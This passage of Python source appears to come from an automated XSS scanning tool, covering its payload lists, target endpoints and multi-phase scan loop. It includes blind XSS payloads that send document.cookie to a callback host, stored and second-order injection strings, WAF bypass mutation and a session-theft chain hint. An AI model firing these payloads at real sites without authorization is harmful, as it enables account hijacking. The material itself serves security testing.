        "innerHTML", "outerHTML", "insertAdjacentHTML",
        "document.write", "document.writeln",
        # Script execution
        "eval(", "Function(", "setTimeout(", "setInterval(",
        "setImmediate(", "execScript(",
        "crypto.generateCRMFRequest(",
        # Navigation
        "location.assign", "location.replace",
        "location.href", "location=",
        # Element creation
        "createElement", "createElementNS",
        # jQuery sinks
        "$.html(", ".html(", "$.append(", ".append(",
        "$.prepend(", ".prepend(", "$.after(", ".after(",
        "$.before(", ".before(", "$.replaceWith(", ".replaceWith(",
        "$.parseHTML(",
        # Angular
        "$compile(", "$parse(", "bypassSecurityTrust",
        # React (dangerouslySetInnerHTML handled separately)
    ]
    
    # ==========================================================================
    # BLIND XSS PAYLOADS
    # ==========================================================================
    
    BLIND_XSS_PAYLOADS = [
        '"><script src=https://{callback}/x.js></script>',
        "'><script src=https://{callback}/x.js></script>",
        "<script src=https://{callback}/x.js></script>",
        '"><img src=x onerror="(new Image()).src=\'https://{callback}/?\'+document.cookie">',
        "<img src=x onerror=fetch('https://{callback}/?'+document.cookie)>",
        '"><iframe src="javascript:fetch(\'https://{callback}/?c=\'+document.cookie)">',
    ]
    
    # ==========================================================================
    # STORED XSS - Persistence Verification Endpoints
    # ==========================================================================
    
    # Known endpoints where data persists and is later rendered
    STORED_XSS_ENDPOINTS = {
        # Generic patterns
        "generic": [
            # Format: (submit_endpoint, submit_method, submit_data_template, retrieve_endpoint)
            # submit_data_template uses {payload} placeholder
            ("/api/feedback", "POST", {"comment": "{payload}", "rating": 5}, "/api/Feedbacks"),
            ("/api/Feedbacks", "POST", {"comment": "{payload}", "rating": 5}, "/api/Feedbacks"),
            ("/comments", "POST", {"comment": "{payload}"}, "/comments"),
            ("/feedback", "POST", {"feedback": "{payload}"}, "/feedback"),
            ("/reviews", "POST", {"review": "{payload}"}, "/reviews"),
            ("/posts", "POST", {"content": "{payload}"}, "/posts"),
            ("/messages", "POST", {"message": "{payload}"}, "/messages"),
            ("/profile", "POST", {"bio": "{payload}"}, "/profile"),
            ("/api/comments", "POST", {"text": "{payload}"}, "/api/comments"),
        ],
        # E-commerce patterns (generic API structures)
        "ecommerce": [
            ("/api/feedbacks", "POST", {"comment": "{payload}", "rating": 5}, "/api/feedbacks"),
            ("/api/reviews", "POST", {"message": "{payload}", "author": "test"}, "/api/reviews"),
            ("/api/products/reviews", "POST", {"review": "{payload}"}, "/api/products"),
            ("/api/users", "POST", {"email": "{payload}@test.com", "username": "{payload}"}, "/api/users"),
            ("/api/orders", "POST", {"notes": "{payload}"}, "/api/orders"),
        ],
        # REST API patterns (generic)
        "rest-api": [
            ("/rest/user", "POST", {"name": "{payload}"}, "/rest/user"),
            ("/rest/products/search", "GET", {"q": "{payload}"}, "/rest/products/search"),
            ("/rest/track", "GET", {"id": "{payload}"}, "/rest/track"),
        ],
        # WordPress
        "wordpress": [
            ("/wp-comments-post.php", "POST", {"comment": "{payload}"}, "/"),
            ("/wp-admin/post.php", "POST", {"content": "{payload}"}, "/"),
        ],
        # Common CMS patterns
        "cms": [
            ("/admin/comments", "POST", {"body": "{payload}"}, "/admin/comments"),
            ("/blog/comment", "POST", {"content": "{payload}"}, "/blog"),
        ],
    }
    
    # Stored XSS specific payloads (shorter, more reliable)
    STORED_XSS_PAYLOADS = [
        '<script>alert("STORED_XSS_{id}")</script>',
        '<img src=x onerror=alert("STORED_XSS_{id}")>',
        '<svg onload=alert("STORED_XSS_{id}")>',
        '"><script>alert("STORED_XSS_{id}")</script>',
        "'-alert('STORED_XSS_{id}')-'",
        '<iframe src="javascript:alert(\'STORED_XSS_{id}\')">',
        '<body onload=alert("STORED_XSS_{id}")>',
        '<marquee onstart=alert("STORED_XSS_{id}")>',
    ]

    # ==========================================================================
    # SECOND-ORDER XSS - Input Flow Tracking (FN Reduction 2026-02-19)
    # ==========================================================================
    #
    # Second-order XSS is missed ~60% of the time because:
    # 1. Payload submitted at endpoint A (/profile/update)
    # 2. Stored in database
    # 3. Rendered at COMPLETELY DIFFERENT endpoint B (/admin/users, /reports)
    #
    # Solution: Track inputs → Check render locations → Detect cross-page XSS

    # Locations where stored data commonly renders (different from input)
    SECOND_ORDER_RENDER_LOCATIONS = [
        # Admin/Staff panels (highest priority - often render user data raw)
        "/admin/users",
        "/admin/customers",
        "/admin/members",
        "/admin/accounts",
        "/admin/logs",
        "/admin/activity",
        "/admin/audit",
        "/admin/reports",
        "/admin/dashboard",
        "/staff/users",
        "/staff/tickets",
        "/manage/users",
        "/management/users",
        "/backoffice/users",
        "/internal/users",
        # API endpoints that return stored data
        "/api/users",
        "/api/v1/users",
        "/api/v2/users",
        "/api/customers",
        "/api/members",
        "/api/profiles",
        "/api/accounts",
        "/api/activity",
        "/api/logs",
        "/api/audit",
        "/api/comments",
        "/api/reviews",
        "/api/feedback",
        "/api/messages",
        "/api/notifications",
        # Reports/Exports (render stored data in different context)
        "/reports",
        "/reports/users",
        "/reports/activity",
        "/reports/export",
        "/export/users",
        "/export/csv",
        "/export/pdf",
        "/download/report",
        # User listings
        "/users",
        "/members",
        "/customers",
        "/profiles",
        "/directory",
        "/people",
        "/team",
        # Activity/Audit logs
        "/activity",
        "/logs",
        "/audit",
        "/history",
        "/timeline",
        "/events",
        # Notifications/Messages
        "/notifications",
        "/messages",
        "/inbox",
        "/alerts",
        # Comments/Reviews/Feedback
        "/comments",
        "/reviews",
        "/feedback",
        "/testimonials",
        # Search results (often render stored data)
        "/search",
        "/search/users",
        "/search/results",
        # Dashboard widgets
        "/dashboard",
        "/home",
        "/overview",
        # GraphQL (can expose stored data)
        "/graphql",
        "/api/graphql",
    ]

    # Payloads with unique markers for second-order tracking
    SECOND_ORDER_PAYLOADS = [
        # Script-based (most reliable for execution detection)
        '<script>/*SECONDORDER_{marker}*/alert(1)</script>',
        '<img src=x onerror="/*SECONDORDER_{marker}*/alert(1)">',
        '<svg onload="/*SECONDORDER_{marker}*/alert(1)">',
        # Attribute breakouts
        '"><script>/*SECONDORDER_{marker}*/</script><"',
        "'-/*SECONDORDER_{marker}*/-'",
        # Event handlers
        '" onfocus="/*SECONDORDER_{marker}*/alert(1)" autofocus="',
        "' onmouseover='/*SECONDORDER_{marker}*/alert(1)'",
        # Template injection (for Angular/Vue/React admin panels)
        '{{constructor.constructor("/*SECONDORDER_{marker}*/alert(1)")()}}',
        '${/*SECONDORDER_{marker}*/alert(1)}',
        # Markdown/Rich text (admin panels often render markdown)
        '[link](javascript:/*SECONDORDER_{marker}*/alert(1))',
        '![img](x" onerror="/*SECONDORDER_{marker}*/alert(1))',
    ]

    # Input endpoints to track (where user data is submitted)
    SECOND_ORDER_INPUT_ENDPOINTS = [
        # Profile/Account updates
        (r"/profile", ["bio", "about", "description", "name", "nickname", "display_name"]),
        (r"/account", ["name", "bio", "description", "company", "website"]),
        (r"/settings", ["name", "bio", "signature", "status"]),
        (r"/user", ["name", "bio", "about", "description"]),
        # Registration/Signup
        (r"/register", ["username", "name", "email", "company"]),
        (r"/signup", ["username", "name", "email", "organization"]),
        # Feedback/Comments
        (r"/feedback", ["comment", "message", "text", "feedback"]),
        (r"/comment", ["comment", "body", "text", "content"]),
        (r"/review", ["review", "text", "body", "content", "title"]),
        # Support/Tickets
        (r"/support", ["message", "description", "title", "subject"]),
        (r"/ticket", ["message", "description", "title", "content"]),
        (r"/contact", ["message", "name", "company", "subject"]),
        # Posts/Content
        (r"/post", ["content", "body", "text", "title"]),
        (r"/article", ["content", "body", "title", "excerpt"]),
        (r"/blog", ["content", "title", "excerpt", "body"]),
        # API endpoints
        (r"/api/.*/(profile|user|account)", ["name", "bio", "description"]),
        (r"/api/.*/(comment|review|feedback)", ["text", "body", "content"]),
    ]

    def __init__(
        self,
        settings: "Settings",
        *,  # Force keyword args for DI parameters
        payload_library: Any = None,  # Phase 8: Optional injected PayloadLibrary
        waf_bypass_engine: Any = None,  # Phase 8: Optional injected WAFBypassEngine
    ) -> None:
        # Phase 8: Pass injected dependencies to base class
        super().__init__(
            settings,
            payload_library=payload_library,
            waf_bypass_engine=waf_bypass_engine,
        )
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self.waf_detector = WAFDetector()
        self.csp_analyzer = CSPAnalyzer()
        self.mutator = PayloadMutator()

        # 2026-02-20: Advanced response analysis integration
        # Uses sophisticated echo detection from utils/response_analyzer.py
        self.echo_detector = PayloadEchoDetector()
        self.confidence_engine = ConfidenceEngine()
        self.blind_callback = getattr(settings, 'blind_xss_callback', None)
        self._detected_waf: WAFType = WAFType.NONE
        self._csp_info: dict = {}
        self._base_url: str = ""  # Resolved in scan()

        # FIX 2026-02-16: Increased limits to catch HTML-entity encoded payloads
        # Entity-encoded payloads (&#60;script&#62;) are at index 25-40, need higher limit
        self.max_payloads_per_param = 50   # Increased from 20 to reach entity payloads
        self.max_findings_per_param = 5    # Keep at 5 - focus on distinct contexts
        self.max_mutations_per_context = 8 # Increased from 4 to test more encodings

        # Per-endpoint timeout to prevent single endpoint from blocking
        self.endpoint_timeout = 15.0       # PERF-FIX 2026-02-12: Reduced from 45s to 15s per endpoint

        # Progress tracking for early exit when no findings
        self._endpoints_without_findings: int = 0
        self._max_no_progress_endpoints = 25  # Reduce thoroughness after 25 endpoints with no findings

        # FIX 2026-02-19: Second-order XSS input tracking (~60% miss rate reduction)
        # Tracks all inputs submitted during scan to check for cross-page rendering
        self._tracked_inputs: list[TrackedInput] = []
        self._second_order_markers_sent: set[str] = set()

        # Phase 8: Use injected payload library if available, else get singleton
        self._payload_library = self.get_payload_library() or PayloadLibrary.get_instance()

        # SECOND-ORDER (2026-02-20): Centralized tracker for cross-module detection
        # In addition to internal _tracked_inputs, use shared tracker
        self._second_order_tracker: "SecondOrderTracker | None" = None

    def _init_second_order_tracker(self) -> None:
        """Initialize the centralized second-order tracker for this scan."""
        if not _SECOND_ORDER_AVAILABLE:
            return
        try:
            self._second_order_tracker = SecondOrderTracker.get_instance()
            logger.debug("[XSS] Second-order tracker initialized")
        except Exception as e:
            logger.debug(f"[XSS] Could not initialize second-order tracker: {e}")
            self._second_order_tracker = None

    def _record_second_order_input(
        self,
        endpoint: str,
        param_name: str,
        payload: str,
        method: str = "GET",
        response_status: int = 0,
        response_contains_marker: bool = False,
    ) -> None:
        """
        Record an input for centralized second-order vulnerability detection.

        This supplements the internal _tracked_inputs with shared tracking
        to enable cross-module detection (e.g., XSS payload causing SQLi).
        """
        if not self._second_order_tracker:
            return

        try:
            # Generate a unique marker for this payload
            marker = self._second_order_tracker.generate_marker(SecondOrderVulnType.XSS)

            self._second_order_tracker.record_input(
                endpoint=endpoint,
                field_name=param_name,
                payload=payload,
                marker=marker,
                vuln_type=SecondOrderVulnType.XSS,
                method=method,
                response_status=response_status,
                response_contains_marker=response_contains_marker,
                auth_headers=getattr(self, "_auth_headers", {}),
                metadata={
                    "module": "xss_scanner",
                    "detection_method": "second_order",
                },
            )
            logger.debug(
                f"[XSS] Recorded second-order input: {param_name}={payload[:30]}... -> {marker}"
            )
        except Exception as e:
            logger.debug(f"[XSS] Error recording second-order input: {e}")

    def _get_waf_detection(self) -> "WAFDetectionResult | None":
        """Get WAF detection result from asset_data if available.

        2026-02-20: Used for WAFBypassEngine integration.
        Returns the WAFDetectionResult from full_scanner's Phase 0.95 detection.
        """
        if not _WAF_BYPASS_ENGINE_AVAILABLE:
            return None

        if not hasattr(self, '_asset_data') or not isinstance(self._asset_data, dict):
            return None

        waf_detection = self._asset_data.get("waf_detection")
        if waf_detection is not None and hasattr(waf_detection, 'detected'):
            return waf_detection

        return None

    def _get_payload_mutations(self, payload: str, mutation_level: int = 3) -> list[str]:
        """Generate payload mutations using WAFBypassEngine when available.

        2026-02-20: Wrapper method that integrates WAFBypassEngine with PayloadMutator.
        Provides intelligent WAF bypass based on behavioural classification.
        """
        waf_detection = self._get_waf_detection()
        return self.mutator.mutate(payload, mutation_level, waf_detection)

    def _get_library_xss_payloads(self, context: XSSContext | None = None, max_payloads: int = 30) -> list[str]:
        """
        Get XSS payloads from centralized PayloadLibrary.

        Args:
            context: XSS context (HTML_TEXT, HTML_ATTRIBUTE, JS_STRING, etc.)
            max_payloads: Maximum number of payloads to return

        Returns:
            List of payload strings, falling back to hardcoded if library fails
        """
        try:
            # Map XSSContext to PayloadLibrary context strings
            context_map = {
                XSSContext.HTML_TEXT: "html_tag",
                XSSContext.HTML_ATTRIBUTE: "html_attr",
                XSSContext.HTML_ATTRIBUTE_UNQUOTED: "html_attr",
                XSSContext.HTML_ATTRIBUTE_SINGLE: "html_attr_quoted",
                XSSContext.JS_STRING: "js_string",
                XSSContext.JS_STRING_SINGLE: "js_string",
                XSSContext.JS_TEMPLATE: "js_block",
                XSSContext.JS_BLOCK: "js_block",
                XSSContext.URL_PARAM: "url",
                XSSContext.CSS_VALUE: "css",
            }
            lib_context = context_map.get(context) if context else None

            payloads = self._payload_library.get_payloads(
                PayloadCategory.XSS,
                context=lib_context,
                with_waf_bypass=(self._detected_waf != WAFType.NONE),
                max_payloads=max_payloads,
            )
            if payloads:
                return payloads
            # Fallback to hardcoded
            return self.POLYGLOT_PAYLOADS[:max_payloads]
        except Exception as e:
            logger.debug(f"[XSS] PayloadLibrary error, using fallback: {e}")
            return self.POLYGLOT_PAYLOADS[:max_payloads]

    def _get_library_polyglot_payloads(self, max_payloads: int = 10) -> list[str]:
        """
        Get polyglot XSS payloads from centralized PayloadLibrary.

        Returns:
            List of polyglot payload strings
        """
        try:
            payload_objects = self._payload_library.get_payload_objects(
                PayloadCategory.XSS,
            )
            # Filter for polyglot-tagged payloads
            polyglots = []
            for p in payload_objects:
                if "polyglot" in p.tags or (not p.context):  # No context = works in multiple contexts
                    polyglots.append(p.raw)
                    if len(polyglots) >= max_payloads:
                        break
            if polyglots:
                return polyglots
            # Fallback to hardcoded
            return self.POLYGLOT_PAYLOADS[:max_payloads]
        except Exception as e:
            logger.debug(f"[XSS] PayloadLibrary error, using fallback: {e}")
            return self.POLYGLOT_PAYLOADS[:max_payloads]

    @staticmethod
    def _resolve_base_url(host: str) -> str:
        """Resolve host to a proper base URL with correct protocol."""
        if host.startswith("http://") or host.startswith("https://"):
            parsed = urlparse(host)
            return f"{parsed.scheme}://{parsed.netloc}"
        port = host.split(":")[-1] if ":" in host else "443"
        if port in ("80", "8080", "8000", "3000", "5000", "8888"):
            return f"http://{host}"
        return f"https://{host}"
        
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: "RateLimiter",
    ) -> dict[str, Any]:
        """
        Execute comprehensive XSS scan with GOD-MODE features.
        """
        logger.info(f"[XSS-GOD-MODE-v3.0] Starting scan on {host}")

        # THEME-9: Initialize budget tracking to prevent cognitive saturation
        self.init_budget()

        # SECOND-ORDER (2026-02-20): Initialize centralized tracker for cross-module detection
        self._init_second_order_tracker()

        findings: list[dict] = []
        info_items: list[dict] = []
        self._base_url = self._resolve_base_url(host)

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._ctx.log_context_status()
        # PERF-FIX 2026-02-20: Store asset_data for intelligent payload selection
        self._asset_data = asset_data

        # Auth headers from context (cleaner than manual extraction)
        self._auth_headers = self._ctx.auth_headers
        if self._ctx.has_auth:
            logger.info(f"[XSS] Using authenticated session ({self._ctx.auth_method})")

        # Phase 1: Initial reconnaissance
        recon = await self._reconnaissance(host, rate_limiter)
        self._detected_waf = recon["waf"]
        self._csp_info = recon["csp"]
        
        if recon["waf"] != WAFType.NONE:
            info_items.append({
                "type": "waf_detected",
                "waf": recon["waf"].value,
                "message": f"WAF detected: {recon['waf'].value}. Using bypass techniques."
            })
            logger.info(f"[XSS] WAF detected: {recon['waf'].value}")
        
        if recon["csp"]["present"]:
            info_items.append({
                "type": "csp_analysis",
                "csp": recon["csp"],
                "bypasses": recon["csp"]["bypasses"],
            })
            logger.info(f"[XSS] CSP present with {len(recon['csp']['bypasses'])} potential bypasses")
        
        # Phase 2: Test URL parameters
        if isinstance(asset_data, dict):
            endpoints = asset_data.get("endpoints", [])
        if isinstance(asset_data, dict):
            params = asset_data.get("parameters", [])
        if isinstance(asset_data, dict):
            forms = asset_data.get("forms", [])
        if isinstance(asset_data, dict):
            js_files = asset_data.get("js_files", [])

        # Get shared findings store for inter-module communication
        if isinstance(asset_data, dict):
            shared_store = asset_data.get("shared_findings_store")
        skipped_endpoints = 0

        # ENHANCEMENT: Get parameters discovered by arjun for targeted testing
        if isinstance(asset_data, dict):
            tool_discovered_params = asset_data.get("tool_discovered_params") or {}
        if tool_discovered_params:
            logger.info(f"[XSS] Using {len(tool_discovered_params)} parameter sets discovered by arjun")

        # ENHANCEMENT 2026-02-20: Get endpoint_params and vuln_type_hints from metadata discovery
        # This enables testing of endpoints discovered from /scanner, /api-docs, etc.
        endpoint_params: dict[str, list[str]] = {}
        vuln_type_hints: dict[str, list[str]] = {}
        if isinstance(asset_data, dict):
            endpoint_params = asset_data.get("endpoint_params", {})
            vuln_type_hints = asset_data.get("vuln_type_hints", {})
        if endpoint_params:
            logger.info(f"[XSS] Received {len(endpoint_params)} endpoints with params from metadata discovery")
        if vuln_type_hints:
            xss_hinted = sum(1 for hints in vuln_type_hints.values()
                           if any(h in hints for h in ("REFLECTED_XSS", "PERSISTENT_XSS", "DOM_XSS", "XSS")))
            if xss_hinted > 0:
                logger.info(f"[XSS] {xss_hinted} endpoints have XSS vulnerability type hints")

        # CROSS-MODULE TARGETING: Add endpoints where SQLi/NoSQL found injectable params
        if shared_store:
            from utils.shared_findings_store import VulnType
            existing_urls = {e.split("?")[0] if "?" in e else e for e in endpoints}
            cross_module_types = [VulnType.SQL_INJECTION, VulnType.NOSQL_INJECTION, VulnType.SSTI]
            for vtype in cross_module_types:
                for sf in shared_store.get_findings_by_type(vtype):
                    if sf.endpoint and sf.endpoint not in existing_urls:
                        url = sf.endpoint
                        if sf.parameter:
                            url = f"{sf.endpoint}?{sf.parameter}=test"
                        endpoints.append(url)
                        logger.debug(f"[XSS] Cross-module target added from {sf.module}: {url}")

        # Create default test endpoints if none provided
        if not endpoints:
            endpoints = [f"{self._base_url}/"]

        # ═══════════════════════════════════════════════════════════════════════════
        # COVERAGE TRACKING & PER-ENDPOINT CAPS
        # COV-01 + RATE-01 FIX: Track what was tested, limit requests per endpoint
        # ═══════════════════════════════════════════════════════════════════════════
        endpoints_tested = 0
        endpoints_found_vuln = 0
        self._endpoint_request_counts: dict[str, int] = {}

        # TIMEOUT-FIX 2026-02-12: Initialize progress tracking
        self._endpoints_without_findings = 0
        self._thoroughness_reduced = False

        for endpoint in endpoints:
            # THEME-9: Check budget before testing
            if not self.can_make_request():
                logger.info(f"[XSS] Request budget exhausted, stopping endpoint tests")
                self.track_skip(endpoint, "BUDGET_EXHAUSTED", "xss", "Module request limit reached")
                break

            # TIMEOUT-FIX 2026-02-12: Early exit if no progress after many endpoints
            # FIX 2026-03-02: Guard with flag — was firing on every iteration after
            # threshold, logging "reducing thoroughness" 12+ times in the same ms.
            if self._endpoints_without_findings >= self._max_no_progress_endpoints and not self._thoroughness_reduced:
                self._thoroughness_reduced = True
                logger.info(f"[XSS] No findings after {self._endpoints_without_findings} endpoints, reducing thoroughness (50→10 payloads, 8→2 mutations)")
                self.max_payloads_per_param = 10
                self.max_mutations_per_context = 2

            # OPTIMIZATION: Skip endpoints already known to be vulnerable to XSS
            # No need to test again if another scanner already found XSS
            if shared_store and shared_store.should_skip_test(endpoint, None, "xss", reason_log=False):
                skipped_endpoints += 1
                self.track_skip(endpoint, "ALREADY_COVERED", "xss", "Already has XSS finding")
                logger.debug(f"[XSS] Skipping {endpoint} - already has XSS finding")
                continue

            # Reset per-endpoint counter
            self._endpoint_request_counts[endpoint] = 0

            await rate_limiter.acquire(host)
            try:
                # TIMEOUT-FIX 2026-02-12: Per-endpoint timeout to prevent single endpoint blocking
                endpoint_findings = await asyncio.wait_for(
                    self._test_endpoint_xss(endpoint, rate_limiter),
                    timeout=self.endpoint_timeout
                )
                if endpoint_findings:
                    # THEME-9: Check finding budget
                    for finding in endpoint_findings:
                        if not self.can_add_finding():
                            logger.info(f"[XSS] Finding budget exhausted, skipping additional findings")
                            break
                        findings.append(finding)
                        # THEME-9: Record hypothesis for cross-module coordination
                        param = finding.get("metadata", {}).get("param", "")
                        if param:
                            self.record_hypothesis(endpoint, param, "reflectable", True, "XSS confirmed")
                    endpoints_found_vuln += 1
                    self.track_test(endpoint, "xss", payloads_sent=self._endpoint_request_counts.get(endpoint, 5), found_vulnerability=True, depth="THOROUGH")
                    self._endpoints_without_findings = 0  # Reset on finding
                else:
                    self.track_test(endpoint, "xss", payloads_sent=self._endpoint_request_counts.get(endpoint, 5), found_vulnerability=False, depth="THOROUGH")
                    self._endpoints_without_findings += 1
                endpoints_tested += 1
            except asyncio.TimeoutError:
                logger.warning(f"[XSS] Endpoint timeout after {self.endpoint_timeout}s: {endpoint}")
                self.track_skip(endpoint, "TIMEOUT", "xss", f"Endpoint test exceeded {self.endpoint_timeout}s limit")
                self._endpoints_without_findings += 1
            except httpx.HTTPStatusError as e:
                if e.response.status_code == 429:
                    self.track_rate_limited(endpoint, "xss")
                elif e.response.status_code in (401, 403):
                    self.track_auth_required(endpoint, "xss")
                else:
                    logger.debug(f"[XSS] Error testing endpoint {endpoint}: {e}")
            except Exception as e:
                logger.debug(f"[XSS] Error testing endpoint {endpoint}: {e}")
        
        # Phase 3: Test forms
        for form in forms:
            await rate_limiter.acquire(host)
            try:
                form_findings = await self._test_form_xss(host, form, rate_limiter)
                findings.extend(form_findings)
            except Exception as e:
                logger.debug(f"[XSS] Error testing form: {e}")

        # Phase 3.5: Test arjun-discovered parameters (hidden parameters)
        arjun_tested = 0
        for endpoint_url, params in tool_discovered_params.items():
            if not params:
                continue

            # Skip if endpoint already has XSS finding
            if shared_store and shared_store.has_vulnerability(endpoint_url, "xss"):
                logger.debug(f"[XSS] Skipping {endpoint_url} - already has XSS finding")
                continue

            for param in params[:10]:  # Limit to 10 params per endpoint
                await rate_limiter.acquire(host)
                try:
                    test_url = f"{endpoint_url}?{param}=test"
                    param_findings = await self._test_endpoint_xss(test_url, rate_limiter)
                    if param_findings:
                        for finding in param_findings:
                            if isinstance(finding, dict):
                                finding.setdefault("metadata", {})
                                finding["metadata"]["discovered_by"] = "arjun"
                                finding["metadata"]["hidden_parameter"] = param
                        findings.extend(param_findings)
                        arjun_tested += 1
                except Exception as e:
                    logger.debug(f"[XSS] Error testing arjun param {param}: {e}")

        if arjun_tested > 0:
            logger.info(f"[XSS] Tested {arjun_tested} arjun-discovered parameters")

        # Phase 4: DOM XSS analysis
        for js_url in js_files:
            await rate_limiter.acquire(host)
            try:
                dom_findings = await self._analyze_dom_xss(host, js_url)
                findings.extend(dom_findings)
            except Exception as e:
                logger.debug(f"[XSS] Error analyzing DOM XSS: {e}")
        
        # TIMEOUT-FIX 2026-02-12: Wrap remaining phases with timeouts
        phase_timeout = 15.0  # Max 15s per phase

        # Phase 5: Test common XSS vectors
        try:
            await rate_limiter.acquire(host)
            common_findings = await asyncio.wait_for(
                self._test_common_vectors(host, rate_limiter),
                timeout=phase_timeout
            )
            findings.extend(common_findings)
        except asyncio.TimeoutError:
            logger.debug("[XSS] Phase 5 (common vectors) timeout")

        # Phase 6: STORED XSS - Test persistence endpoints with real verification
        try:
            logger.info(f"[XSS] Phase 6: Testing Stored XSS with persistence verification")
            stored_xss_findings = await asyncio.wait_for(
                self._test_stored_xss_with_persistence(host, rate_limiter, asset_data),
                timeout=phase_timeout
            )
            findings.extend(stored_xss_findings)
        except asyncio.TimeoutError:
            logger.debug("[XSS] Phase 6 (stored XSS) timeout")

        # Phase 6.5: SECOND-ORDER XSS - Cross-page payload tracking (FN Reduction 2026-02-19)
        # Tracks inputs submitted at endpoint A, checks if they render at endpoint B
        # This catches ~60% of second-order XSS that traditional scanners miss
        try:
            logger.info("[XSS] Phase 6.5: Testing Second-Order XSS (cross-page tracking)")
            second_order_findings = await asyncio.wait_for(
                self._test_second_order_xss(host, rate_limiter, asset_data),
                timeout=phase_timeout * 1.5,  # Allow more time for cross-page testing
            )
            findings.extend(second_order_findings)
            if second_order_findings:
                logger.info(
                    f"[XSS] Phase 6.5: Found {len(second_order_findings)} second-order XSS vulnerabilities"
                )
        except asyncio.TimeoutError:
            logger.debug("[XSS] Phase 6.5 (second-order XSS) timeout")

        # Phase 7: Template Injection (Angular/Vue/React/Handlebars/EJS)
        try:
            logger.info("[XSS] Phase 7: Testing framework template injection")
            template_findings = await asyncio.wait_for(
                self._test_template_injection(host, endpoints, rate_limiter),
                timeout=phase_timeout
            )
            findings.extend(template_findings)
        except asyncio.TimeoutError:
            logger.debug("[XSS] Phase 7 (template injection) timeout")

        # Phase 8: HTTP Header XSS (2026-02-12)
        # Tests XSS in headers like User-Agent, Referer that may be logged/reflected
        try:
            logger.info("[XSS] Phase 8: Testing HTTP header injection")
            header_findings = await asyncio.wait_for(
                self._test_header_xss(host, endpoints[:10], rate_limiter),
                timeout=phase_timeout
            )
            findings.extend(header_findings)
        except asyncio.TimeoutError:
            logger.debug("[XSS] Phase 8 (header XSS) timeout")

        # Phase 9: JSON Body XSS (2026-02-12)
        # Tests XSS in JSON API fields that may be stored and reflected
        try:
            logger.info("[XSS] Phase 9: Testing JSON API body injection")
            json_findings = await asyncio.wait_for(
                self._test_json_body_xss(host, endpoints, rate_limiter),
                timeout=phase_timeout
            )
            findings.extend(json_findings)
        except asyncio.TimeoutError:
            logger.debug("[XSS] Phase 9 (JSON XSS) timeout")

        # Phase 9.5: METADATA-DISCOVERED ENDPOINTS (2026-02-20)
        # Test endpoints from /scanner, /api-docs that have XSS vulnerability hints
        # This enables targeted testing of known-vulnerable endpoints in training apps
        xss_hint_types = {"REFLECTED_XSS", "PERSISTENT_XSS", "DOM_XSS", "XSS", "STORED_XSS"}
        metadata_tested = 0
        metadata_found = 0
        for ep_url, hints in vuln_type_hints.items():
            # Only test endpoints with XSS hints
            if not any(h in xss_hint_types for h in hints):
                continue

            # Check budget
            if not self.can_make_request():
                logger.info("[XSS] Budget exhausted during metadata endpoint testing")
                break

            # Get parameters for this endpoint
            params = endpoint_params.get(ep_url, [])
            if not params:
                # Infer default XSS parameters if none specified
                params = ["input", "name", "search", "q", "query", "message", "text", "value"]

            # Normalize URL to use correct base
            if ep_url.startswith("/"):
                test_base = f"{self._base_url}{ep_url}"
            elif not ep_url.startswith("http"):
                test_base = f"{self._base_url}/{ep_url}"
            else:
                test_base = ep_url

            # Skip if already tested
            base_path = test_base.split("?")[0]
            if shared_store and shared_store.has_vulnerability(base_path, "xss"):
                logger.debug(f"[XSS] Metadata endpoint already has finding: {base_path}")
                continue

            logger.debug(f"[XSS] Testing metadata endpoint with XSS hint: {ep_url} (params: {params[:5]})")

            for param in params[:8]:  # Test up to 8 parameters
                await rate_limiter.acquire(host)
                try:
                    test_url = f"{test_base}?{param}=test" if "?" not in test_base else f"{test_base}&{param}=test"
                    param_findings = await asyncio.wait_for(
                        self._test_endpoint_xss(test_url, rate_limiter),
                        timeout=self.endpoint_timeout
                    )
                    if param_findings:
                        for finding in param_findings:
                            if isinstance(finding, dict):
                                finding.setdefault("metadata", {})
                                finding["metadata"]["discovered_by"] = "metadata_endpoint"
                                finding["metadata"]["vuln_type_hint"] = [h for h in hints if h in xss_hint_types]
                        findings.extend(param_findings)
                        metadata_found += len(param_findings)
                except asyncio.TimeoutError:
                    logger.debug(f"[XSS] Timeout testing metadata endpoint param: {param}")
                except Exception as e:
                    logger.debug(f"[XSS] Error testing metadata endpoint {ep_url}: {e}")

            metadata_tested += 1

        if metadata_tested > 0:
            logger.info(f"[XSS] Phase 9.5: Tested {metadata_tested} metadata endpoints with XSS hints, found {metadata_found} vulns")

        if skipped_endpoints > 0:
            logger.info(f"[XSS] Skipped {skipped_endpoints} endpoints (already have findings via inter-module communication)")

        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
        # Other modules (SQLi, SSRF, SSTI) can target these vulnerable endpoints
        try:
            from utils.shared_findings_store import SharedFindingsStore
            store = SharedFindingsStore.get_instance()
            for f in findings:
                if isinstance(f, dict):
                    metadata = f.get("metadata", {})
                    if isinstance(asset_data, dict):
                        endpoint = f.get("matched_at") or metadata.get("url", "")
                    if isinstance(asset_data, dict):
                        xss_type = metadata.get("xss_type", "reflected")

                    await store.add_finding(
                        {
                            "type": VulnType.XSS,
                            "endpoint": endpoint,
                            "severity": f.get("severity", "HIGH"),
                            "parameter": metadata.get("param") or metadata.get("vulnerable_param", ""),
                            "xss_type": xss_type,
                        },
                        module="xss",
                    )

                    # THEME-4: Register chain opportunities for session_abuse
                    # XSS → Session theft is a classic attack chain
                    await store.add_extracted_data(
                        data_type="chain_opportunities",
                        values=[{
                            "chain_type": "xss_to_session_theft",
                            "description": f"XSS ({xss_type}) can steal session tokens/cookies",
                            "xss_type": xss_type,
                            "payload_context": metadata.get("context", "html"),
                            "severity": f.get("severity", "HIGH"),
                        }],
                        source_module="xss_scanner",
                        source_endpoint=endpoint,
                        context={
                            "suggested_modules": ["session_abuse", "csrf", "cors"],
                            "attack_scenario": "Inject JS to steal document.cookie or localStorage tokens",
                        },
                    )

            if findings:
                logger.debug(f"[XSS] Shared {len(findings)} findings + chain opportunities")
        except Exception as e:
            logger.debug(f"[XSS] Could not share findings: {e}")

        logger.info(f"[XSS-GOD-MODE-v3.0] Scan complete: {len(findings)} findings")

        # THEME-9: Include saturation data in result
        budget_info = self.get_budget_utilization()
        logger.debug(f"[XSS] Budget utilization: requests={budget_info.get('requests_pct', 0):.1f}%, findings={budget_info.get('findings_pct', 0):.1f}%")

        return {
            "module": self.name,
            "version": self.version,
            "findings": findings,
            "info": info_items,
